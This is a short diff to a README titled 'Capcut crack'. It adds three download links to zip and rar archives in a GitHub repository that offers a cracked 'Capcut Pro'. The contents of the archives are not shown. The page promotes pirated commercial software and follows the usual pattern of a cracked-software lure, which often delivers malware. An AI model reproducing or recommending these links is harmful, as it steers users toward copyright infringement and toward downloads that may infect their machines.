@@ -1,8 +1,8 @@
 # Capcut crack
 
-# [DOWNLOAD]
-# [DOWNLOAD]
-# [DOWNLOAD]
+# [DOWNLOAD](https://github.com/Zamarudo/Capcut-Pro-crack/raw/refs/heads/main/Capcut.zip)
+# [DOWNLOAD](https://github.com/Zamarudo/Capcut-Pro-crack/raw/refs/heads/main/Capcut%20Pro.rar)
+# [DOWNLOAD](https://github.com/Zamarudo/Capcut-Pro-crack/raw/refs/heads/main/AI.zip)
 
 
 
